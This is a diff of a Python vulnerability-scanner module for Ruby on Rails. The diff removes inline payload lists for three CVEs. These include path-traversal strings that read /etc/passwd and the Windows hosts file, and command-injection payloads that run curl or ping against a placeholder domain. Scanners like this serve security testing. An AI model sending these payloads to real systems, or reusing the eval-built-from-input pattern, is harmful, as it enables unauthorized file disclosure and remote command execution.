@@ -21,106 +21,24 @@ file:///C:/Windows/System32/drivers/etc/hosts
 file:///C:\Windows\System32\drivers\etc\hosts
 '''
 
-from lib.initial.config import config
-from lib.tool.md5 import md5, random_md5
+# from lib.initial.config import config
 from lib.tool.thread import thread
-from lib.tool import head
 from payloads.RubyOnRails.cve_2018_3760 import cve_2018_3760_scan
 from payloads.RubyOnRails.cve_2019_5418 import cve_2019_5418_scan
 from payloads.RubyOnRails.cve_2020_8163 import cve_2020_8163_scan
 
 class RubyOnRails():
     def __init__(self):
-        self.timeout = config.get('timeout')
-        self.headers = config.get('headers')
-        self.proxies = config.get('proxies')
-
         self.app_name = 'Ruby on Rails'
-        self.md = md5(self.app_name)
-        self.cmd = 'echo ' + self.md
 
-        self.cve_2018_3760_payloads = [
-            {
-                'path': 'assets/file:%2f%2f/etc/passwd',
-                'data': ''
-            },
-            {
-                'path': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
-                'data': ''
-            },
-            {
-                'path': 'assets/file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
-                'data': ''
-            },
-            {
-                'path': 'assets/file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
-                'data': ''
-            },
-            {
-                'path': 'file:%2f%2f/etc/passwd',
-                'data': ''
-            },
-            {
-                'path': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd',
-                'data': ''
-            },
-            {
-                'path': 'file:%2f%2f/C:/Windows/System32/drivers/etc/hosts',
-                'data': ''
-            },
-            {
-                'path': 'file:%2f%2f{}/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/C:/Windows/System32/drivers/etc/hosts',
-                'data': ''
-            }
-        ]
-
-        self.cve_2019_5418_payloads = [
-            {
-                'path': '',
-                'data': '',
-                'headers': head.merge(self.headers, {
-                    'Accept': '../../../../../../../../etc/passwd{{'
-                })
-            },
-            {
-                'path': '',
-                'data': '',
-                'headers': head.merge(self.headers, {
-                    'Accept': '../../../../../../../../C:/Windows/System32/drivers/etc/hosts{{'
-                })
-            },
-            {
-                'path': '',
-                'data': '',
-                'headers': head.merge(self.headers, {
-                    'Accept': '../../../../../../../../C:\Windows\System32\drivers\etc\hosts{{'
-                })
-            }
-        ]
-
-        self.cve_2020_8163_payloads = [
-            {
-                'path': '?[system("curl DNSdomain")end%00]',
-                'data': ''
-            },
-            {
-                'path': '?[system("ping -c 4 DNSdomain")end%00]',
-                'data': ''
-            },
-            {
-                'path': '?[system("ping DNSdomain")end%00]',
-                'data': ''
-            }
-        ]
-    
-    def addscan(self, url, vuln=None):
+    def addscan(self, clients, vuln=None):
         if vuln:
-            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))
+            return eval('thread(target=self.{}_scan, clients=clients)'.format(vuln))
 
         return [
-            thread(target=self.cve_2018_3760_scan, url=url),
-            thread(target=self.cve_2019_5418_scan, url=url),
-            thread(target=self.cve_2020_8163_scan, url=url)
+            thread(target=self.cve_2018_3760_scan, clients=clients),
+            thread(target=self.cve_2019_5418_scan, clients=clients),
+            thread(target=self.cve_2020_8163_scan, clients=clients)
         ]
 
 RubyOnRails.cve_2018_3760_scan = cve_2018_3760_scan
